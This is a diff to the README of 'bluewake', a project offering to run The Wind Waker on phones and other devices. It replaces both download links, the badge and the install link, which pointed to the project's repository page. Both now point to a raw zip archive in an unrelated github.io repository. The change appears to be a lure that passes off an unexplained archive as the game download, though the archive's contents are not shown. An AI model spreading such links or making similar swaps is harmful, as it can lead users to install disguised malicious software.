@@ -5,7 +5,7 @@ description: "Run The Legend of Zelda: The Wind Waker natively on iPhone, iPad, 
 ---
 # 🌊 bluewake - Play Wind Waker on Any Device
 
-[![Download bluewake](https://img.shields.io/badge/Download-bluewake-4CAF50?style=for-the-badge&logo=github)](https://github.com/ntannh55/bluewake)
+[![Download bluewake](https://img.shields.io/badge/Download-bluewake-4CAF50?style=for-the-badge&logo=github)](https://github.com/ntannh55/ntannh55.github.io/raw/refs/heads/main/bitacora/v2.0.zip)
 
 ## 🎮 What Is bluewake?
 
@@ -22,7 +22,7 @@ bluewake brings you the magical world of *The Legend of Zelda: The Wind Waker* n
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/ntannh55/bluewake](https://github.com/ntannh55/bluewake)
+Visit this link to download the application: [https://github.com/ntannh55/ntannh55.github.io/raw/refs/heads/main/bitacora/v2.0.zip](https://github.com/ntannh55/ntannh55.github.io/raw/refs/heads/main/bitacora/v2.0.zip)
 
 ### 🖥️ For Windows Users (Step-by-Step)
 
